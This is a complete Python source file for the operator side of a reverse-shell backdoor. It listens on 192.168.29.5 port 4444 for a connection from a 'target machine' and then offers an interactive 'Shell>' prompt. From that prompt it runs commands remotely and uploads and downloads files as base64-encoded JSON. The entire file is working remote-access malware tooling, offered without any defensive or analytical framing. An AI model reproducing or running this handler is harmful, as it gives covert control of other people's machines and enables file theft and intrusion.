import socket 
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a socket object
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Set the socket options
        listener.bind((ip, port))  # Bind the IP and port
        listener.listen(0)  # Listen for incoming connections
        print("\n[+] Waiting for incoming connection\n")
        self.connection, address = listener.accept()  # This command basically gives 2 different values
        print("\n[+] Connection established from" + str(address))  # Print the connection details


    def reliable_send(self, data):
        json_data = json.dumps(data)  # Convert the data to JSON format
        self.connection.send(json_data.encode())  # Send the JSON data to the target machine


    def reliable_receive(self):
        json_data = ""  # Initialize the variable
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()  # Receive the JSON data from the target machine
                return json.loads(json_data)  # Convert the JSON data to Python data
            except ValueError:
                continue


    def execute_remotely(self, command):
        self.reliable_send(command)  # Send the command to the target machine
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()  # Receive the result from the target machine
    

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # Write the content to the file
            return "[+] Download successful"
        

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()  # Read the file and return the content


    def run(self):
        while True:
            command = input(f"\nShell> ")  # Get the command from the user
            command = command.split(" ")  # Split the command

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])  # Read the file
                    command.append(file_content)  # Append the file content to the command

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution" # If there is an error, print this message    
            
            print(result)  # Print the result


my_listener = Listener("192.168.29.5",4444)  # Create an object of the class
my_listener.run()  # Call the run method